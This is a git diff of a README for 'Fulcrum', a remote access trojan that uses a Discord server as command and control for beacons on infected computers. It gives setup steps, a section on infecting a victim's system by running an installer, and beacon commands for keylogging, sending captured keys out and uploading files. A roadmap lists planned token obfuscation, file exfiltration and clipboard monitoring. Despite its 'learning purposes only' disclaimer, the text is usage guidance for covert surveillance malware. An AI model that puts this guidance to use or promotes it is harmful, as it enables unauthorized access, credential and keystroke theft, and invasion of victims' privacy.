@@ -1,17 +1,21 @@
 # Fulcrum
 **THIS CODE IS FOR LEARNING PURPOSES ONLY. THIS CODE IS NOT FOR USE WITHOUT PERMISSION. THE CURRENT VERSION IS NOT ANONYMIZED AND CAN BE TRACED BACK TO YOU. DO NOT MISUSE THIS!**
 
-Fulcrum is a remote monitoring and access software with a Fulcrum beacon running on an infected computer that is accessible via a dedicated Discord server. The Discord server acts as a command and control server for an unlimited number of beacons. Each beacon creates its own text channel with the PC's name and a hardware ID as the channel's name.
+Fulcrum is a remote monitoring and access software with a Fulcrum beacon running on an infected computer that is accessible via a dedicated Discord server. The Discord server acts as a command and control server for an unlimited number of beacons. Each beacon creates its own text channel with the PC's name and a hardware ID as the channel's name. **Check out the supported commands below ↓**
 
 
 ### Setup
-- If you want the installer to work without a `.env` file, you will need to modify the code and add the token directly. Add the token at the start of both the `fulcrum_beacon.py` file and the `installer.py` file.
+- If you want the installer to work without a `.env` file, you will need to modify the code and add the token directly. Add the token at the start of both the `fulcrum_beacon.pyw` file and the `installer.py` file.
 - Create your own Discord bot at [Discord Developer Portal](https://discord.com/developers/applications).
-- Set up a Discord server with the following structure and invite the bot.
+- Set up a Discord server with the following structure
 
 ![image](https://github.com/user-attachments/assets/c5ecaac9-9e8d-4ba2-b3e6-b98066d3c38b)
 
+- Invite your bot to the server
+- Send your `fulcrum_beacon.pyw` file (can be renamed) into the `fulcrum-beacon` channel
+    - if you want to use a compiled version of `fulcrum_beacon.pyw` you will need Discord nitro to upload the file due to its size.
 
+  
 ### Infecting a System
 - Execute the `installer.py` file on the victim's computer.
   - If you did not modify the code, you will need a `.env` file with your bot token:
@@ -33,7 +37,8 @@ Fulcrum is a remote monitoring and access software with a Fulcrum beacon running
 - **-KL**: Starts a key logger, logging every key pressed.
   - **-UHK**: Stops and unhooks the keylogger.
   - **-GLK**: Gets logged keys and sends them into the channel.
-- **-UF {message_attachment: file}** Uploads a file on the infected computer.
+- **-UF {message_attachment: file}**: Uploads a file on the infected computer.
+- **-MB {message}**: Create a message box that contains a custom message.
 
 ### Example
 ![image](https://github.com/user-attachments/assets/b16d0622-d443-426e-b908-e6943029c2d3)
@@ -41,9 +46,10 @@ Fulcrum is a remote monitoring and access software with a Fulcrum beacon running
 
 ### Soon
 - **Triggers** that will activate the keylogger when certain events happen on the computer.
-- **Installer** that installs the Fulcrum beacon.
 - **Obfuscation and encryption of the discord token.**
-- **File Downloader** A download command that sends a file from the system into the discord channel -GF [path]
+- **File Downloader** A download command that sends a file from the system into the iscord channel -GF [path]
 - **Internet History Log**
 - **Clipboard monitoring**
 
+### Known bugs
+- Keylogger not stopping after -UHK command.
